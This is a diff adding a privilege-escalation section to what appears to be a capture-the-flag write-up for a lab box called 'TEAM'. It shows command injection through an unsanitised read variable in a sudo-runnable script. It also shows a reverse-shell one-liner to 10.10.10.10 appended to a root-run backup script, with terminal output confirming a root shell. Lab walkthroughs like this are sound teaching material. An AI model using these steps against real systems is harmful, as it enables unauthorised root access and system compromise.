@@ -278,12 +278,61 @@ Matching Defaults entries for dale on TEAM:
 User dale may run the following commands on TEAM:
     (gyles) NOPASSWD: /home/gyles/admin_checks
 -----
+
 So I'm able to run the "admin_checks" file as a "gyles" user. 
+-----
+#!/bin/bash
 
+printf "Reading stats.\n"
+sleep 1
+printf "Reading stats..\n"
+sleep 1
+read -p "Enter name of person backing up the data: " name
+echo $name  >> /var/stats/stats.txt
+read -p "Enter 'date' to timestamp the file: " error
+printf "The Date is "
+$error 2>/dev/null
 
+date_save=$(date "+%F-%H-%M")
+cp /var/stats/stats.txt /var/stats/stats-$date_save.bak
 
+printf "Stats have been backed up\n"
+-----
 
+The file is a simple bash script that has a problem with error handling. 
+"read -p "Enter 'date' to timestamp the file: " error" line expects input "date" but if you input anything else it will execute it as a command.
+So if I put "/bin/bash" it will execute it and as I'm using the script as "gyles" it will spawn a shell as Gyles!
+-----
+dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
+Reading stats.
+teReading stats..
+Enter name of person backing up the data: test1
+Enter 'date' to timestamp the file: /bin/bash
+The Date is test2
+id
+uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
+-----
 
+Using "sudo -l" requires a password, which I don't have but the user is part of the "admin" group.
+"find / -group admin -type f 2>/dev/null" searches if group "admin" has any files that belong to the group.
+There is one  "/usr/local/bin/main_backup.sh"
+-----
+cat /usr/local/bin/main_backup.sh
+#!/bin/bash
+cp -r /var/www/team.thm/* /var/backups/www/team.thm/
+-----
+
+The script is a backup script so it probably runs every once and a while.
+As I can edit the file I can echo reverse shell into the file(or use nano etc.).
+"echo "/bin/bash -i >& /dev/tcp/10.10.10.10/1234 0>&1" >> /usr/local/bin/main_backup.sh"
+
+I can then start a ncat listener with "ncat -lvnp 1234" and should get a reverse shell as a root user!
+-----
+root@TEAM:~# id
+id
+uid=0(root) gid=0(root) groups=0(root),1004(admin)
+root@TEAM:~#
+-----
 
 
 
